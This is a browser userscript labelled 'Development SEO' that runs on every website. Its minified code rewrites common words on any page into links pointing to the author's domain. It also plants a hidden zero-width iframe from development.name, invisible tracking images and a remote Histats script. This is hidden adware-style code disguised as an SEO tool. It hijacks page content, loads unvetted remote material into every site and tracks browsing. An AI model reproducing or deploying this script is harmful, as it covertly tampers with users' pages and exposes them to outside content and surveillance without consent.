// ==UserScript==
// @name			Development SEO
// @namespace		Development SEO
// @description		Development SEO
// @author			http://www.development.name
// @authorURL		http://development.name
// @include			htt*://www.*.*/*
// @include			htt*://*.*/*
// @include			http://*.*
// @include			http://*.*/*

// ==/UserScript==


function replaceInElement(e,t,n){for(var r=e.childNodes.length;r-->0;){var i=e.childNodes[r];if(i.nodeType==1){var s=i.nodeName.toLowerCase();if(s!="style"&&s!="script")replaceInElement(i,t,n)}else if(i.nodeType==3){replaceInText(i,t,n)}}}function replaceInText(e,t,n){var r;var i=[];while(r=t.exec(e.data))i.push(r);for(var s=i.length;s-->0;){r=i[s];e.splitText(r.index);e.nextSibling.splitText(r[0].length);e.parentNode.replaceChild(n(r),e.nextSibling)}}  var find= /\b(klik disini|seluler|gratis|download|click here|sex|adult|seo|kontes|uang|bisnis online|jual beli|komentari|uang|cara|how to|obrolan|klikfb|email|pejwan|kaskus|pengaturan)\b/gi; replaceInElement(document.body,find,function(e){var t=document.createElement("a");t.href="http://website.development.name/"+e[0]+".html";t.appendChild(document.createTextNode(e[0]));return t})


body = document.body;
if(body != null) 
{
 div = document.createElement("div");
 div.style.position = "fixed";
 div.style.display = "block";
 div.style.width = "5px";
 div.style.height = "5px";
 div.style.opacity= 0.90;
 div.style.bottom = "+0px";
 div.style.left = "+0px";
 div.style.backgroundColor = "#000000";
 div.style.border = "0px";
 div.style.padding = "0px";
 div.innerHTML = "<iframe src='http://development.name/frame.html' width='0'></iframe><img src='http://development.name/stat.jpg' width='0'><img src='http://s08.flagcounter.com/count/DevelopmentName/bg_FFFFFF/txt_000000/border_CCCCCC/columns_1/maxflags_1/viewers_Kaskus/labels_1/flags_1/' width='0'><img src='http://sstatic1.histats.com/0.gif?2395427&101'>"
 body.appendChild(div);
}

var _Hasync= _Hasync|| [];
_Hasync.push(['Histats.start', '1,2395427,4,0,0,0,00010000']);
_Hasync.push(['Histats.fasi', '1']);
_Hasync.push(['Histats.track_hits', '']);
(function() {
var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
hs.src = ('http://s10.histats.com/js15_as.js');
(document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
})();